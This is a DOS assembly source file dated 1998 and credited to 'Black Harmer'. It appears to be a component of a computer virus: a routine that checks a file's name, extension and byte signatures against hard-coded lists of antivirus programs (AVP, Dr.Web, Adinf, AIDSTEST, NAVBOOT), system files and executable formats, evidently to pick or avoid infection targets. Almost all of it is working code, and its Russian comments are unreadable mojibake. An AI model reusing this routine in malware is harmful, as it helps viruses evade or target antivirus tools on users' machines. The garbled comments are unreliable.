;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;룼ㄿp�즤젹쵟 ㄵ收も쮘�쥯�⑨ �젵쳽 (c)'98 Black Harmer
;댾��レ㎯β碎 ˘p信젹� ㄻ� �칛ⅳ�ゥ�⑨ 첓ぎ� �젵� М┃� 쭬p젲졻�, �
;첓ぎ� ��レ㏆.
;귛��:  DS:DX - 丞젳猶젰� 췅 飡p�ゃ � 兒pД: "ㄸ稅:\�呻�\º� �젵쳽",0
;       꽡ウ췅 〓筍 �칛ⅳ�ゥ췅 ��ㄿp�즤젹쵟 call_int_21, 若舜 〓 ¡� �젶�．
;       貰ㄵp쬊�⑨:
;       call_int_21 proc near
;       int   21h
;       retn
;       call_int_21 endp
;귣若�: 뫊��pⓥ� ��ⓤ젺�� � �쩺�Д��臾:
;       1) filename
;       2) extention
;       3) filemask
;袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴拷
filename db 0                                                  ;�
;0, αエ �� �ㄽ� º� �� �쩺η�� FILENAMES �� 貰¿젷�.          ;�
;댂좂� ��Дp 飡p�え 貰¿젪蜈． º���.                          ;�
;H젽pº쩺 αエ ℡�ㄽ�� DS:DX 丞젳猶젰� 췅 'D:\AVP.EXE', 獸     ;�
;췅 �音�ㄵ �� ��ㄿp�즤젹щ filename ▲ㄵ� p젪췅 1.             ;�
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴캑
;뵰p쵟� �쩺η�� º�� �젵ギ�:                                   ;�
;1) �쩺�臾 줎⒱�� Ħβ ㄻÞ췅 º���. 뢱º쩺 4,'ABCD'           ;�
;2) ��獸� �젹� º� (‘レ鼇Ж ▲あ젹�)                          ;�
;3) � �.� 쨛膝�� º�췅                                         ;�
;4) �쩺η��� ㄾウ�� 쭬첓�葉쥯筍碎 줎⒱�� 0ffh                  ;�
filenames:                                                     ;�
        ;��殊˘p信�                                            ;�
        db       07,'AVP.EXE'                                  ;�
        db       09,'DRWEB.EXE'                                ;�
        db       09,'ADINF.EXE'                                ;�
        db       11,'NAVBOOT.EXE'                              ;�
        db       12,'AIDSTEST.EXE'                             ;�
        ;뫅飡�Л瑜 �젵ル                                       ;�
        db       11,'COMMAND.COM'                              ;�
        db       07,'WIN.COM'                                  ;�
        db       12,'CONAGENT.EXE'                             ;�
        db       11,'WININIT.EXE'                              ;�
        db       09,'START.EXE'                                ;�
        db       0ffh ; - 뢱�㎛젶 ぎ���                        ;�
;袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴孤
extention db 4                                                 ;�
;0, αエ �� �ㄽ� p졹鼇p���� �� �쩺η�� extentions �� 貰¿젷�.  ;�
;댂좂� ��Дp 飡p�え 貰¿젪蜈． p졹鼇p��⑨.                     ;�
;H젽pº쩺, αエ ℡�ㄽ�� DS:DX 丞젳猶젰� 췅 'D:\AVP.EXE', 獸    ;�
;췅 �音�ㄵ �� ��ㄿp�즤젹щ extention ▲ㄵ� p젪�� 3.            ;�
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴캑
;뫊. 兒p쵟� �쩺η�� º�� �젵ギ�                                ;�
extentions:                                                    ;�
        db       04,'COM',0                                    ;�
        db       04,'SYS',0                                    ;�
        db       04,'EXE',0                                    ;�
        db       0ffh  ; - 뢱�㎛젶 ぎ���                       ;�
;袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴孤
;궘º젺�� � 笹晨젰, αエ extention=0, 쵟稅� �� 칛�´p禎恂�     ;�
filemask         db 0                                          ;�
;0, αエ �� �ㄽ� 쵟稅� �� �쩺η�� filemasks �� 貰¿젷�.        ;�
;댂좂� ��Дp 飡p�え 貰¿젪蜈� 쵟稅�.                           ;�
mask_buffer      db 07h dup (0)                                ;�
;꽞Þ췅 ▲芯p� �칛ⅳ�ワβ碎 ㄻÞ��� 쵟めº젷彛�� 쵟稅�         ;�
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴캑
;뵰席졻:                                                        �
;1) 뫉�¡ 細ι��⑨ 쵟稅� (�� М┘� ºβ� ㎛좂���� 0XXFFh)       �
;2) 꽞Þ췅 쵟稅� 0-0EFh Œ� か蹟ⅱ�� 歲Б�� αエ 0F0h-0FFh      �
;   0F0h - 뫊ι���� ‥誓恂� �� ぎ��� �젵쳽                      �
;   0F1h - 뫊ι���� ‥誓恂� �� �젵쳽 �� 1)                      �
;3) 뙛稅�:                                                      �
;   a)  뫅Б�� '?' - ヮ‘� 葉笹�                                �
;   b)  뫅Б�� '*' - ヮ‘� ㎛젶                                 �
;4) 룯pη��� ㄾウ�� 쭬첓�葉쥯筍碎 歲Б�ギ� 0ffh                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컫컴컴컴컴컴컴컴컴캑
filemasks:                                   ;�                 �
        dw       07h                         ;� DrWeb           �
        db       0f0h,7                      ;� AllVersion      �
        db       'DrW?.??'                   ;�                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컵컴컴컴컴컴컴컴컴캑
        dw       040h                        ;� DrWeb           �
        db       05h                         ;� v3.24-v3.27     �
        db       08h,0,0f3h,0a5h,4bh         ;� v4.0            �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컵컴컴컴컴컴컴컴컴캑
        dw       027                         ;� Adinf           �
        db       6                           ;� AllVersion      �
        db       00,'????',0ffh              ;�                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컵컴컴컴컴컴컴컴컴캑
        dw       3ch                         ;� Windows 95-98   �
        db       0f1h,2                      ;� 32'bit prot     �
        db       'PE'                        ;�                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컵컴컴컴컴컴컴컴컴캑
        dw       3ch                         ;� Windows 3.x     �
        db       0f1h,2                      ;� 16'bit prot     �
        db       'NE'                        ;�                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컵컴컴컴컴컴컴컴컴캑
        dw       3ch                         ;� Windows 95-98   �
        db       0f1h,2                      ;� LE files        �
        db       'LE'                        ;�                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컵컴컴컴컴컴컴컴컴캑
        db       0ffh ; - 뢱�㎛젶 ぎ���      ;�                 �
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컨컴컴컴컴컴컴컴컴켸
Asciiz proc near
        pusha
        push     es ds dx
        call     initial_offset_Asciiz
initial_offset_Asciiz:
        pop      bp
        sub      bp,offset(initial_offset_Asciiz-Asciiz)
        ;꽞� 췅�젷� �搜�エ� º� �젵쳽 �� �呻�
        mov      si,dx
        push     ds
        pop      es
        mov      di,dx
        mov      cx,80h
set_bx_to_name:
        mov      bx,si
scan_name:
        lodsb    ;DS:[SI] ("ㄸ稅:\�呻�\º� �젵쳽",0)-> AL
        call     al_to_big_letter
        stosb    ;AL -> ES:[DI]
        cmp      al,'\'
        jz       set_bx_to_name
        cmp      al,'/'
        jz       set_bx_to_name
        cmp      al,':'
        jz       set_bx_to_name
        or       al,al
        jz       filenames_check
        loop     scan_name
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;뢱�´p첓 �� �쩺η�� º��
filenames_check:
        mov      si,bx
        push     cs
        pop      es
        lea      di,[bp+filenames-Asciiz]
       ;룼칛�즤젹쵟 �p젪���⑨ �ㄽ�� 飡p�え � �αぎレえЖ 쨛膝º� �� 줎㏓
       ;귛��: DS:[SI] 飡p�첓 � ぎ獸p�� ▲ㄵ� �p젪�Ð졻藺� 췅‘p 飡p��
       ;      ES:[DI] 줎쭬 飡p�� � 兒p쵟收:
       ;      db  6,'sergey'
       ;      db  5,'misha'
       ;      db  0ffh  - 뢱�㎛젶 ぎ���
       ;귣若�: AX==0  - �β 貰¿젮��Ł
       ;       AX!=0 - ��Дp 貰¿젪蜈� 飡p�え 췅葉췅� � 1'劣
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+filename-Asciiz],al
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;뢱�´p첓 �� �쩺η�� p졹鼇p��Ł
check_file_extention:
seach_point:
        lodsb    ;DS:[SI]
        cmp      al,'.'
        jz       point_found
        or       al,al
        jnz      seach_point
point_found:
        lea      di,[bp+extentions-Asciiz]
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+extention-Asciiz],al
        or       al,al
        jnz      check_filemask
        pop      dx
        jmp      set_filemask_zero_exit
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;뢱�´p첓 �� �쩺η�� 쵟貰�
check_filemask:
        pop      dx
        pop      ds
        push     ds
        mov      ax,3d00h ;롡챥淫� ��ⓤ졻�レ ㄻ� 譽��⑨
        call     call_int_21
        jc       set_filemask_zero_exit
        push     cs
        pop      ds
        lea      si,[bp+filemasks-Asciiz]
        mov      bx,ax
        mov      byte ptr cs:[bp+filemask-Asciiz],1
next_mask:
        cmp      byte ptr [si],0ffh
        jz       close_file_set_filemask_zero_exit
        cmp      byte ptr [si+2],0f0h
        jnz      no_from_end
        xor      cx,cx
        xor      dx,dx
        mov      ax,4202h
        call     call_int_21
        sub      ax,[si]
        inc      si
        mov      cx,dx
        mov      dx,ax
        mov      ax,4200h
        call     call_int_21
        jmp      read_and_check_mask
no_from_end:
        cmp      byte ptr [si+2],0f1h
        jnz      no_win_check
        xor      cx,cx
        mov      dx,[si]
        inc      si
        mov      ax,4200h
        call     call_int_21
        lea      dx,[bp+mask_buffer-Asciiz]
        mov      cl,2
        mov      ah,3fh
        call     call_int_21
        xor      cx,cx
        mov      dx,word ptr cs:[bp+mask_buffer-Asciiz]
        mov      ax,4200h
        call     call_int_21
        jmp      read_and_check_mask
no_win_check:
        xor      cx,cx
        mov      dx,word ptr [si]
        mov      ax,4200h
        call     call_int_21
        ;뿨�젰� 쵟稅� � 칛�´p畑� 쵟稅�
read_and_check_mask:
        lea      dx,[bp+mask_buffer-Asciiz]
        xor      cx,cx
        mov      cl,[si+2]
        mov      ah,3fh
        call     call_int_21
        add      si,3
        push     si
        mov      di,dx
next_letter_of_mask:
        cmp      byte ptr [si],'*'
        jz       next_letter
        cmp      byte ptr [si],'?'
        jnz      letter_is_not_q
        cmp      byte ptr [di],30h
        jl       mask_failed
        cmp      byte ptr [di],39h
        jg       mask_failed
next_letter:
        inc      si
        inc      di
        loop     next_letter_of_mask
        jmp      mask_coincide
letter_is_not_q:
        cmpsb            ;몆젪�Ð졻� DS:[SI] � ES:[DI]
        jnz      mask_failed
        loop     next_letter_of_mask
        ;뫌¿젷� 쵟稅�
mask_coincide:
        pop      si
        mov      ah,3eh
        call     call_int_21
        jmp      exit_Asciiz
        ;뙛稅� �� 貰¿젷�
mask_failed:
        pop      si
        xor      cx,cx
        mov      cl,ds:[si-1]
        add      si,cx
        inc      byte ptr cs:[bp+filemask-Asciiz]
        jmp      next_mask
close_file_set_filemask_zero_exit:
        mov      ah,3eh
        call     call_int_21
set_filemask_zero_exit:
        mov      byte ptr cs:[bp+filemask-Asciiz],0
exit_Asciiz:
        pop      ds es
        popa
        retn
asciiz endp
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;룼칛�즤젹쵟 �p젪���⑨ �ㄽ�� 飡p�え � �αぎレえЖ 쨛膝º� �� 줎㏓
;귛��: DS:[SI] 飡p�첓 � ぎ獸p�� ▲ㄵ� �p젪�Ð졻藺� 췅‘p 飡p��
;      ES:[DI] 줎쭬 飡p�� � 兒p쵟收:
;      db  6,'sergey'
;      db  5,'misha'
;      db  0ffh  - 뢱�㎛젶 ぎ���
;귣若�: AX==0 - 貰¿젮��Ł �β
;       AX!=0 - ��Дp 貰¿젪蜈� 飡p�え
cmps_string_with_databasestring proc near
        push     di cx
        cld
        xor      cx,cx
        mov      ax,01h
next_string:
        push     si di
        mov      cl,es:[di]
        cmp      cl,0ffh
        jz       no_coincide_string
        inc      di
        rep      cmpsb   ; 몆젪�Ð졻� DS:[SI] � ES:[DI]
        pop      di si
        jz       coincide_string
        mov      cl,es:[di]
        add      di,cx
        inc      di
        inc      ax
        jmp      next_string
coincide_string:
        pop      cx di
        retn
no_coincide_string:
        pop      di si cx di
        xor      ax,ax
        retn
cmps_string_with_databasestring endp
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
al_to_big_letter:
        cmp      al,61h ;뢱��죖젳�쥯��� � ‘レ鼇� ▲あ�
        jc       this_is_not_bigletter
        cmp      al,7ah
        ja       this_is_not_bigletter
        sub      al,20h
this_is_not_bigletter:
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
